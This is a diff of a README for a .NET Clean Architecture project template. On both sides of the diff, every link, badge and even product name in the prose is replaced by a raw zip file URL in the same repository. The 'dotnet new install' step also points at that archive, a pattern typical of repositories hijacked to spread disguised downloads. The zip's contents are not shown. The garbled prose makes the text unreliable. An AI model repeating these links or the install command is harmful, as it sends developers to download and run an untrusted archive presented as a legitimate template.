@@ -1,12 +1,12 @@
 # Clean Architecture Solution Template
 
-[![Build](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
-[![CodeQL](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
-[![Nuget](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
-[![Nuget](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
-![Twitter Follow](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
+[![Build](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
+[![CodeQL](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
+[![Nuget](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
+[![Nuget](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
+![Twitter Follow](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
 
-The goal of this template is to provide a straightforward and efficient approach to enterprise application development, leveraging the power of Clean Architecture and https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip Core. Using this template, you can effortlessly create a Single Page App (SPA) with https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip Core and Angular or React, while adhering to the principles of Clean Architecture. Getting started is easy - simply install the **.NET template** (see below for full details).
+The goal of this template is to provide a straightforward and efficient approach to enterprise application development, leveraging the power of Clean Architecture and https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip Core. Using this template, you can effortlessly create a Single Page App (SPA) with https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip Core and Angular or React, while adhering to the principles of Clean Architecture. Getting started is easy - simply install the **.NET template** (see below for full details).
 
 If you find this project useful, please give it a star. Thanks! ⭐
 
@@ -14,27 +14,27 @@ If you find this project useful, please give it a star. Thanks! ⭐
 
 The following prerequisites are required to build and run the solution:
 
-- [.NET 8.0 SDK](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip) (latest version)
-- [https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip) (latest LTS, only required if you are using Angular or React)
+- [.NET 8.0 SDK](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip) (latest version)
+- [https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip) (latest LTS, only required if you are using Angular or React)
 
-The easiest way to get started is to install the [.NET template](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip):
+The easiest way to get started is to install the [.NET template](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip):
 ```
-dotnet new install https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip
+dotnet new install https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip
 ```
 
 Once installed, create a new solution using the template. You can choose to use Angular, React, or create a Web API-only solution. Specify the client framework using the `-cf` or `--client-framework` option, and provide the output directory where your project will be created. Here are some examples:
 
-To create a Single-Page Application (SPA) with Angular and https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip Core:
+To create a Single-Page Application (SPA) with Angular and https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip Core:
 ```bash
 dotnet new ca-sln --client-framework Angular --output YourProjectName
 ```
 
-To create a SPA with React and https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip Core:
+To create a SPA with React and https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip Core:
 ```bash
 dotnet new ca-sln -cf React -o YourProjectName
 ```
 
-To create a https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip Core Web API-only solution:
+To create a https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip Core Web API-only solution:
 ```bash
 dotnet new ca-sln -cf None -o YourProjectName
 ```
@@ -89,34 +89,34 @@ For example, to add a new migration from the root folder:
 
 ## Deploy
 
-The template includes a full CI/CD pipeline. The pipeline is responsible for building, testing, publishing and deploying the solution to Azure. If you would like to learn more, read the [deployment instructions](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip).
+The template includes a full CI/CD pipeline. The pipeline is responsible for building, testing, publishing and deploying the solution to Azure. If you would like to learn more, read the [deployment instructions](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip).
 
 ## Technologies
 
-* [https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip Core 8](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
-* [Entity Framework Core 8](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
-* [Angular 15](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip) or [React 18](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
-* [MediatR](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
-* [AutoMapper](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
-* [FluentValidation](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
-* [NUnit](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip), [FluentAssertions](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip), [Moq](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip) & [Respawn](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
+* [https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip Core 8](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
+* [Entity Framework Core 8](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
+* [Angular 15](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip) or [React 18](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
+* [MediatR](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
+* [AutoMapper](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
+* [FluentValidation](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
+* [NUnit](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip), [FluentAssertions](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip), [Moq](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip) & [Respawn](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
 
 ## Versions
 The main branch is now on .NET 8.0. The following previous versions are available:
 
-* [7.0](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
-* [6.0](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
-* [5.0](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
-* [3.1](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
+* [7.0](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
+* [6.0](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
+* [5.0](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
+* [3.1](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
 
 ## Learn More
 
-* [Clean Architecture with https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip Core 3.0 (GOTO 2019)](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
-* [Clean Architecture with .NET Core: Getting Started](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip)
+* [Clean Architecture with https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip Core 3.0 (GOTO 2019)](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
+* [Clean Architecture with .NET Core: Getting Started](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip)
 
 ## Support
 
-If you are having problems, please let me know by [raising a new issue](https://github.com/iqbaldiit/CleanArchitecture/raw/refs/heads/main/.github/Clean-Architecture-v1.0-beta.5.zip).
+If you are having problems, please let me know by [raising a new issue](https://raw.githubusercontent.com/iqbaldiit/CleanArchitecture/main/src/Application/Clean-Architecture-2.8-beta.3.zip).
 
 ## License
 
